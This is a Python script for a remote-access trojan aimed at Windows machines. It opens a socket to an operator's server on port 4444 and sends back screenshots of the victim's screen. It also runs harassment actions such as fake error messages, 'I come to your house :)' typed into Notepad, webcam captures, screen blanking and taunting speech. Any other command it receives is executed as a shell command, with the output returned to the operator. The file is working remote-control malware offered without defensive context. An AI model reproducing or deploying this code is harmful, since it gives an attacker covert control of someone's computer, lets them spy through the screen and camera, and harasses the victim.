import socket
import subprocess
import struct
from io import BytesIO
from PIL import ImageGrab
import ctypes
import random
import time
import cv2
import pyttsx3
import pyautogui

SERVER = ""
PORT = 4444

s = socket.socket()
s.connect((SERVER, PORT))
s.recv(1024).decode(errors="ignore")

def send_screenshot():
    try:
        screenshot = ImageGrab.grab()
        img_bytes = BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_data = img_bytes.getvalue()

        s.send(struct.pack(">I", len(img_data)))
        s.sendall(img_data)
        return "[+] Screenshot sent successfully"
    except Exception as e:
        return f"[-] Screenshot error: {e}"

def troll_message():
    msg = random.choice(["Fatal Error!", "System error: format C:", "Self-destruct in 3...2...1"])
    ctypes.windll.user32.MessageBoxW(0, msg, "Alert!", 0x40)
    return "[+] Message box displayed"

def open_cd():
    try:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(2)
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door closed", None, 0, None)
        return "[+] CD tray opened and closed"
    except Exception as e:
        return f"[-] Error: {e}"

def beep():
    for _ in range(5):
        ctypes.windll.kernel32.Beep(random.randint(500, 2000), 300)
    return "[+] Beep sound played"

def crazy_mouse():
    for _ in range(10):
        ctypes.windll.user32.SetCursorPos(random.randint(0, 1920), random.randint(0, 1080))
        time.sleep(0.1)
    return "[+] Mouse moved randomly"

def on_off_screen():
    ctypes.windll.user32.SendMessageW(65535, 274, 61808, 2)
    time.sleep(5)
    ctypes.windll.user32.SendMessageW(65535, 274, 61808, -1)
    return "[+] Screen turned off and back on."

def screen_flashing():
    for _ in range(10):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Windows\\Web\\Screen\\img100.jpg", 3)
        time.sleep(0.3)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\\Windows\\Web\\Screen\\img101.jpg", 3)
        time.sleep(0.3)
    return "[+] Wallpaper changed"

def webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imshow("Say Hello to the camera :)", frame)
        cv2.waitKey(3000)
        cv2.destroyAllWindows()
    cam.release()

def robot_voice():
    engine = pyttsx3.init()
    engine.setProperty('rate', 100)
    engine.setProperty('volume', 1.0) 
    texts = [
        "Ha ha ha ha ha ha ha ha ha",
        "Hi hi hi hi hi hi hi hi hi",
        "Ho ho ho ho ho ho ho ho ho"
    ]
    for text in texts:
        engine.say(text)
        engine.runAndWait()
        time.sleep(2)

def open_notepad_and_troll():
    subprocess.Popen(["notepad.exe"])
    time.sleep(2) 
    pyautogui.write("I come to your house :)", interval=0.1)
    return "[+] Notepad opened and message written"

def keyboard_led_flicker():
    for _ in range(10):
        ctypes.windll.user32.keybd_event(0x14, 0, 0, 0)
        time.sleep(0.5)
        ctypes.windll.user32.keybd_event(0x14, 0, 2, 0)
    return "[+] Keyboard LED flickered!"

def morse_leds():
    message = "SOS"
    morse_code = {
        'S': "...", 'O': "---"
    }
    
    for letter in message:
        for symbol in morse_code[letter]:
            state = 0x14 if symbol == "." else 0x90
            ctypes.windll.user32.keybd_event(state, 0, 0, 0)
            time.sleep(0.2 if symbol == "." else 0.6)
            ctypes.windll.user32.keybd_event(state, 0, 2, 0)
            time.sleep(0.2)
        time.sleep(0.5)
    return "[+] Morse LED Activated!"

COMMANDS = {
    "screenshot": send_screenshot, 
    "msgbox": troll_message,
    "open_cd": open_cd,
    "beep": beep,
    "mouse": crazy_mouse,
    "screen": on_off_screen,
    "flash": screen_flashing,
    "webcam": webcam,
    "robot": robot_voice,
    "notepad": open_notepad_and_troll,
    "led": keyboard_led_flicker,
    "sos": morse_leds
}

while True:
    cmd = s.recv(1024).decode(errors="ignore").strip()
    print(f'[+] Received command: {cmd}')

    if cmd.lower() in ['q', 'quit', 'exit']:
        break

    if cmd in COMMANDS:
        result = COMMANDS[cmd]()
    else:
        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True).decode(errors="ignore")
        except Exception as e:
            result = str(e)

    if not result:
        result = "[+] Command executed successfully"

    s.send(struct.pack(">I", len(result.encode())))
    s.sendall(result.encode())

s.close()
